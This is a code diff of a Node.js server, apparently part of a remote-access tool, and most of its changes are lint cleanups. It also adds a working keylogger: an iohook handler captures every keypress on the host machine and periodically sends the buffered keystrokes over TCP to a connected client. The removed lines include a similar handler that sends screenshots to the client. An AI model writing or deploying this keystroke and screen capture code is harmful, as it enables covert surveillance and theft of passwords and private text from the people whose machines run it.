@@ -1,11 +1,12 @@
-
 const { EventEmitter } = require('events')
 const { Packets, PacketParser } = require('./lib/Protocol')
 const Connection = require('./lib/Connection')
 
+const iohook = require('iohook')
+
 class Server {
   constructor (password) {
-    let self = this
+    const self = this
 
     this._UDPport = 41234
     this._TCPport = 41233
@@ -27,7 +28,7 @@ class Server {
     this.clients_lookup = {}
 
     {
-      let TCPserver = new Connection.TCP.Server()
+      const TCPserver = new Connection.TCP.Server()
 
       TCPserver.listen(this._TCPport, '127.0.0.1', function () {
         const address = this.address()
@@ -58,7 +59,7 @@ class Server {
     }
 
     {
-      let UDPserver = new Connection.UDP.Server()
+      const UDPserver = new Connection.UDP.Server()
 
       UDPserver.on('listening', function () {
         const address = this.address()
@@ -74,12 +75,53 @@ class Server {
       UDPserver.bind(this._UDPport, '0.0.0.0')
       this._UDPserver = UDPserver
     }
+
+    this.on(Packets.KeylogSetup, function (packet, conn) {
+      if (!packet.data) return
+
+      if (!conn.keylog) {
+        conn.keylog = {
+          buffer: [],
+          intervalID: null,
+          keyEvt: evt => {
+            conn.keylog.buffer.push(evt.keychar)
+          }
+        }
+      }
+
+      function disableKeylog () {
+        clearInterval(conn.keylog.intervalID)
+        conn.keylog.intervalID = null
+        iohook.off('keypress', conn.keylog.keyEvt)
+      }
+
+      if (packet.data.interval === 0) {
+        console.log('DISABLE')
+        disableKeylog()
+        return
+      }
+
+      if (conn.keylog.intervalID) clearInterval(conn.keylog.intervalID)
+
+      iohook.on('keypress', conn.keylog.keyEvt)
+      iohook.start()
+
+      conn.keylog.intervalID = setInterval(function () {
+        // Send loop
+        if (conn.keylog.buffer.length != 0) {
+          conn.tcp.write(Packets.r_Keylog.create(conn.keylog.buffer))
+          conn.keylog.buffer = []
+        }
+      }, packet.data.interval)
+
+      conn.tcp.__destructors.keylog = disableKeylog
+    })
   }
 
   _onPayload (payload, socket) {
     try {
-      let rawPacket = JSON.parse(payload.toString())
-      let packet = PacketParser(rawPacket)
+      const rawPacket = JSON.parse(payload.toString())
+      const packet = PacketParser(rawPacket)
       this._onPacket(packet, socket)
     } catch (e) {
       console.log('DROPPED: ', e)
@@ -93,11 +135,11 @@ class Server {
     // } else {
     //   console.debug('>RECV_TCP>', packet)
     // }
-    
+
     let connectionPair = null
 
     if (socket._isUDP) {
-      let address = `${socket.address}:${socket.port}`
+      const address = `${socket.address}:${socket.port}`
 
       if (packet.constructor === Packets.Hello) {
         connectionPair = this.clients[packet.data] // id
@@ -118,7 +160,10 @@ class Server {
       }
 
       // assume that a connection from the address is correct?
-      if (this.clients_lookup[address] && this.clients_lookup[address].tcp.__userAuthenticated__) {
+      if (
+        this.clients_lookup[address] &&
+        this.clients_lookup[address].tcp.__userAuthenticated__
+      ) {
         connectionPair = this.clients_lookup[address]
       }
     } else {
@@ -129,12 +174,12 @@ class Server {
         } else {
           if (
             new Date() - socket.__lastAuthenticationAttempt__ <
-        this.__authAttemptInterval__
+            this.__authAttemptInterval__
           ) {
             return
           }
 
-          let data = packet.data
+          const data = packet.data
 
           if (!data) return
           if (!data.id) return
@@ -150,13 +195,15 @@ class Server {
 
             if (!socket.__destructors) {
               socket.__destructors = []
-              socket.on('close', function() {
-                Object.values(this.__destructors).forEach(f => f());
+              socket.on('close', function () {
+                Object.values(this.__destructors).forEach(f => f())
               })
             }
 
             if (this.clients[data.id]) {
-              if (this.clients[data.id].tcp) this.clients[data.id].tcp.destroy()
+              if (this.clients[data.id].tcp) {
+                this.clients[data.id].tcp.destroy()
+              }
             } else {
               this.clients[data.id] = {
                 tcp: socket
@@ -168,7 +215,8 @@ class Server {
               Packets.r_Hello.create({
                 status: false,
                 attempts:
-              this.__maxAuthAttempts__ - ++socket.__authenticationAttemptCount__
+                  this.__maxAuthAttempts__ -
+                  ++socket.__authenticationAttemptCount__
               })
             )
             socket.__lastAuthenticationAttempt__ = new Date()
@@ -201,57 +249,4 @@ class Server {
   }
 }
 
-//
-
-let server = new Server('Hello123')
-const iohook = require('iohook');
-
-server.on(Packets.KeylogSetup, function(packet, conn) {
-  if (!packet.data) return;
-
-  if (!conn.keylog) {
-    conn.keylog = {
-      buffer: [],
-      intervalID: null,
-      keyEvt: (evt) => {
-        conn.keylog.buffer.push(evt.keychar)
-      }
-    }
-  }
-
-  function disableKeylog() {
-    clearInterval(conn.keylog.intervalID);
-    conn.keylog.intervalID = null
-    iohook.off('keypress', conn.keylog.keyEvt)
-  }
-
-  if (packet.data.interval === 0) {
-    console.log("DISABLE");
-    disableKeylog();
-    return;
-  }
-
-  if (conn.keylog.intervalID) clearInterval(conn.keylog.intervalID);
-  
-  iohook.on('keypress', conn.keylog.keyEvt)
-  iohook.start()
-
-  conn.keylog.intervalID = setInterval(function() {
-    // Send loop
-    if (conn.keylog.buffer.length != 0) {
-      conn.tcp.write(Packets.r_Keylog.create(conn.keylog.buffer))
-      conn.keylog.buffer = [];
-    }
-  }, packet.data.interval)
-  
-  conn.tcp.__destructors.keylog = disableKeylog
-})
-
-
-const screenshot = require('./lib/Screenshot');
-server.on(Packets.Screenshot, async function(packet, conn) {
-  let screenshotData = await screenshot.screenshot();
-  conn.tcp.write(Packets.r_Screenshot.create(
-    screenshotData
-  ))
-})
+module.exports = Server
